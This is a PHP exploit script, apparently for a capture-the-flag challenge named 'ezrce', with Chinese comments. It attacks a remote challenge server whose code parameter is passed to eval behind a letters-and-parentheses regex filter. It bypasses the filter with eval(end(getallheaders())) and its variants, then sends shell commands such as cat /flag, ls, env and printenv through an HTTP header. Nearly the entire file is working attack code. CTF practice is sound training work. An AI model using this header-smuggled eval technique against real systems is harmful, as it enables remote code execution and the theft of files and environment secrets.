<?php
// CTF ezrce 利用脚本
// 题目限制: 正则 ^[A-Za-z\(\)_;]+$

$target = "http://challenge.bluesharkinfo.com:28143";

echo "=== CTF ezrce 利用脚本 ===\n\n";

// 方法1: 使用 getallheaders() + end()
echo "[*] 尝试方法 1: eval(end(getallheaders()));\n";
$payload1 = "eval(end(getallheaders()));";
$cmd = "system('cat /flag');";
echo "Payload: ?code=" . urlencode($payload1) . "\n";
echo "Header: Cmd: $cmd\n\n";

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $target . "?code=" . urlencode($payload1));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, array("Cmd: $cmd"));
$result1 = curl_exec($ch);
curl_close($ch);

echo "响应:\n";
echo $result1 . "\n";
echo str_repeat("-", 50) . "\n\n";

// 方法2: 使用 current()
echo "[*] 尝试方法 2: eval(current(getallheaders()));\n";
$payload2 = "eval(current(getallheaders()));";
echo "Payload: ?code=" . urlencode($payload2) . "\n\n";

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $target . "?code=" . urlencode($payload2));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, array("Cmd: $cmd"));
$result2 = curl_exec($ch);
curl_close($ch);

echo "响应:\n";
echo $result2 . "\n";
echo str_repeat("-", 50) . "\n\n";

// 方法3: 使用 reset()
echo "[*] 尝试方法 3: eval(reset(getallheaders()));\n";
$payload3 = "eval(reset(getallheaders()));";
echo "Payload: ?code=" . urlencode($payload3) . "\n\n";

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $target . "?code=" . urlencode($payload3));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, array("Cmd: $cmd"));
$result3 = curl_exec($ch);
curl_close($ch);

echo "响应:\n";
echo $result3 . "\n";
echo str_repeat("-", 50) . "\n\n";

// 尝试其他常见命令
$commands = array(
    "ls /",
    "ls",
    "cat /f*",
    "env",
    "printenv"
);

echo "[*] 尝试其他命令:\n";
foreach ($commands as $command) {
    echo "\n执行命令: $command\n";
    $cmd_payload = "system('$command');";

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $target . "?code=" . urlencode($payload1));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array("Cmd: $cmd_payload"));
    $result = curl_exec($ch);
    curl_close($ch);

    echo "结果: " . $result . "\n";
}

echo "\n=== 完成 ===\n";
